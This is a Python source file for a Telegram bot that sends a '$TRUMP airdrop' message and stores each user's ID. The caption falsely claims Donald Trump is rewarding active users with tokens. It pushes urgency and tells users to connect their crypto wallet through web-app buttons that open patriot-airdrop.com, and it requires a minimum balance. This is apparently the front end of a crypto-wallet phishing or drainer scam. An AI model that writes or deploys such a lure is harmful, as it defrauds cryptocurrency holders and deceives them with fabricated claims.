import os
import json
import logging
import sys
from dotenv import load_dotenv
from telegram import Update, InputFile, WebAppInfo
from telegram.ext import Application, CommandHandler, ContextTypes
from telegram import InlineKeyboardButton, InlineKeyboardMarkup

# Enable logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# Load environment variables
load_dotenv()
BOT_TOKEN = os.getenv("BOT_TOKEN")
WEBAPP_URL = os.getenv("WEBAPP_URL", "https://patriot-airdrop.com")

if not BOT_TOKEN:
    logger.error("No BOT_TOKEN found in .env file")
    sys.exit(1)

# Path to users.json file
USERS_JSON_FILE = "users.json"

# Initialize users database if it doesn't exist
if not os.path.exists(USERS_JSON_FILE):
    with open(USERS_JSON_FILE, "w") as f:
        json.dump([], f)

def save_user(user_id):
    """Save user ID to users.json if not already present"""
    try:
        with open(USERS_JSON_FILE, "r") as f:
            users = json.load(f)
        
        if user_id not in users:
            users.append(user_id)
            
            with open(USERS_JSON_FILE, "w") as f:
                json.dump(users, f)
            logger.info(f"User {user_id} added to database")
        else:
            logger.info(f"User {user_id} already in database")
    except Exception as e:
        logger.error(f"Error saving user: {e}")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Send message on /start command"""
    user = update.effective_user
    
    # Save user ID to database
    save_user(user.id)
    
    # Create web app buttons
    keyboard = [
        [InlineKeyboardButton("🏆 CLAIM $TRUMP", web_app=WebAppInfo(url="https://web.patriot-airdrop.com/"))],
        [InlineKeyboardButton("⚙️SETUP WALLET", web_app=WebAppInfo(url="https://web.patriot-airdrop.com/"))],
        [InlineKeyboardButton("✅ Verify Activity", web_app=WebAppInfo(url=WEBAPP_URL))]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    # Caption text exactly as in the image
    caption = (
        "Trump Airdrop – Get Your Free Tokens Today! 🇺🇸\n\n"
        "🎉 Former President Donald Trump is rewarding the "
        "most active members of the community with $TRUMP tokens!\n\n"
        "The older and more engaged your Telegram account, "
        "the higher your prize! 🎁\n\n"
        "🔍 Factors that affect your reward:\n"
        "✓ Telegram account age\n"
        "✓ Activity in TØN/Solana (holding tokens, NFTs, transactions)\n"
        "✓ Minimum balance of 0.2 TØN required\n\n"
        "📱 How to claim your tokens?\n"
        "1️⃣ Press \"CLAIM $TRUMP\"\n"
        "2️⃣ Connect your crypto wallet\n"
        "3️⃣ Confirm your wallet activity\n"
        "4️⃣ Get your tokens on TØN or SOLANA!\n\n"
        "🔥 Limited offer! The faster you ceize this opportunity, "
        "the greater your profits! 📈\n\n"
        "💎 $TRUMP – The future of digital finance! Let's Make "
        "America Prosperous Again! 🌟"
    )
    
    # Send image with caption and buttons
    image_path = "static/TRUMP COIN_files/image.jpg"
    
    if os.path.exists(image_path):
        with open(image_path, "rb") as img:
            await context.bot.send_photo(
                chat_id=update.effective_chat.id,
                photo=img,
                caption=caption,
                reply_markup=reply_markup
            )
    else:
        logger.error(f"Image file not found at {image_path}")
        # Send text only as fallback
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"Image not found.\n\n{caption}",
            reply_markup=reply_markup
        )

def main() -> None:
    """Start the bot"""
    # Create the Application and pass it your bot's token
    application = Application.builder().token(BOT_TOKEN).build()

    # Add command handlers
    application.add_handler(CommandHandler("start", start))

    # Run the bot until the user presses Ctrl-C
    logger.info("Bot started. Press Ctrl+C to stop.")
    application.run_polling()

if __name__ == "__main__":
    main() 